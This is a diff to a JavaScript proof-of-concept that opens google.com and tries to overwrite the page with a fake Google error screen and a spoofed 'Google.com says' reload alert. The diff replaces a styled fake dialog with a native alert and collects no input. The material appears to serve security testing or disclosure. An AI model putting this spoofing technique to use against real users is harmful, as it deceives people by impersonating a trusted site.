@@ -3,7 +3,6 @@ function runPoC() {
   // Navigate to top-level context
   const w = open("https://www.google.com", "_top");
 
-  // Delay to ensure navigation
   setTimeout(() => {
     try {
       w.document.body.innerHTML = `
@@ -13,57 +12,27 @@ function runPoC() {
             font-family: system-ui, sans-serif;
             background: #f2f2f2;
             text-align: center;
-            padding-top: 20vh;
-          }
-          #overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,.45);
-          }
-          #dialog {
-            background: #fff;
-            max-width: 420px;
-            margin: 18vh auto;
-            padding: 22px;
-            border-radius: 24px;
-            text-align: left;
-            box-shadow: 0 10px 28px rgba(0,0,0,.25);
-          }
-          h3 {
-            margin-top: 0;
-            font-weight: 500;
-          }
-          .actions {
-            text-align: right;
-            margin-top: 16px;
-          }
-          button {
-            background: none;
-            border: none;
-            color: #1a73e8;
-            font-size: 16px;
-            margin-left: 12px;
+            padding-top: 22vh;
           }
         </style>
 
         <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="120">
         <h2>An error has occurred</h2>
-        <p>Please try again.</p>
-
-        <div id="overlay">
-          <div id="dialog">
-            <h3>Google.com says</h3>
-            <p>
-              This page needs to reload to continue.
-            </p>
-            <div class="actions">
-              <button onclick="location.reload()">OK</button>
-            </div>
-          </div>
-        </div>
+        <p>Please wait while the page reloads.</p>
       `;
+
+      // Native dialog – no input, no auth
+      setTimeout(() => {
+        alert(
+          "Google.com says:\n\nThis page needs to reload to continue."
+        );
+
+        // Redirect to legitimate page after dialog
+        location.href = "https://www.google.com";
+      }, 400);
+
     } catch (e) {
-      console.log("Navigation blocked by browser security model");
+      console.log("Blocked by browser security model");
     }
   }, 300);
 }
@@ -71,3 +40,4 @@ function runPoC() {
 // Trigger after delay
 setTimeout(runPoC, 3000);
 </script>
+
